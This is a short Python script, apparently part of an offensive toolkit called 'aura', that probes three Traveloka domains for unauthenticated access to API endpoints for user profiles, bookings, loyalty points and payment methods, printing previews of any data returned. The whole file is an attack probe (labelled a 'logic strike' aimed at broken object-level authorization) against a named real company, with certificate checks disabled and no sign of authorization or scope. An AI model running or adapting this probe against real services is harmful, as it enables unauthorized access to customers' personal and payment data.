import asyncio
import httpx
from aura.ui.formatter import console

async def test_traveloka_api(url, path):
    full_url = url + path
    console.print(f"[*] Probing Traveloka API -> {full_url}")
    try:
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            # We try with a random ID to check for BOLA (401/403 vs 404/200)
            r = await client.get(full_url, follow_redirects=False)
            if r.status_code == 200:
                if "{" in r.text or "[" in r.text:
                    console.print(f"  [bold red][!!!] UNAUTHENTICATED API ACCESS: {full_url}[/bold red]")
                    console.print(f"    Preview: {r.text[:200]}...")
                    return True
            elif r.status_code == 401:
                # console.print(f"  [.] {full_url} -> 401 (Auth Required)")
                pass
            else:
                 # console.print(f"  [.] {full_url} -> {r.status_code}")
                 pass
    except Exception as e:
        # console.print(f"  [red][!] Error: {e}[/red]")
        pass
    return False

async def run_logic_strike():
    domains = [
        "https://www.traveloka.com",
        "https://api.traveloka.com",
        "https://m.traveloka.com"
    ]
    paths = [
        "/api/v1/user/profile",
        "/api/v2/booking/details/12345",
        "/api/v1/loyalty/points",
        "/api/v1/auth/login",
        "/api/v1/user/settings",
        "/api/v1/user/notifications",
        "/api/v1/payment/methods"
    ]
    
    for d in domains:
        for p in paths:
            await test_traveloka_api(d, p)

if __name__ == "__main__":
    asyncio.run(run_logic_strike())
